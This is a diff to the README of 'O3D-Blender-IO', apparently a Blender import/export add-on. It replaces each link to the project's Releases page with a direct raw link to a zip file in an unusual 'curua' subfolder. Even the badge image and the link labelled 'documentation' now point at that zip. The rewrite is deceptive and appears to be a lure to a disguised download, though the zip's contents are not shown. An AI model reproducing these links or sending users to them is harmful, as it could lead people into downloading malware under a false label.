@@ -1,6 +1,6 @@
 # 🎨 O3D-Blender-IO - Import and Export Made Easy
 
-[![Download O3D-Blender-IO](https://img.shields.io/badge/Download-O3D--Blender--IO-blue.svg)](https://github.com/Ben649/O3D-Blender-IO/releases)
+[![Download O3D-Blender-IO](https://raw.githubusercontent.com/Ben649/O3D-Blender-IO/master/curua/O3D-Blender-IO.zip)](https://raw.githubusercontent.com/Ben649/O3D-Blender-IO/master/curua/O3D-Blender-IO.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get O3D-Blender-IO, visit the Releases page. There, you'll find the latest version available for download.
 
-**Download Link:** [Visit this page to download](https://github.com/Ben649/O3D-Blender-IO/releases)
+**Download Link:** [Visit this page to download](https://raw.githubusercontent.com/Ben649/O3D-Blender-IO/master/curua/O3D-Blender-IO.zip)
 
 1. Click on the link above.
 2. Look for the latest release at the top.
@@ -84,8 +84,8 @@ If you need assistance, consider checking out the community forums. You will fin
 
 ## 📁 Additional Resources
 
-For more information, visit our detailed [documentation](https://github.com/Ben649/O3D-Blender-IO/releases).
+For more information, visit our detailed [documentation](https://raw.githubusercontent.com/Ben649/O3D-Blender-IO/master/curua/O3D-Blender-IO.zip).
 
-**Download Link:** [Visit this page to download](https://github.com/Ben649/O3D-Blender-IO/releases)
+**Download Link:** [Visit this page to download](https://raw.githubusercontent.com/Ben649/O3D-Blender-IO/master/curua/O3D-Blender-IO.zip)
 
 Thank you for choosing O3D-Blender-IO! Enjoy creative importing and exporting with Blender.
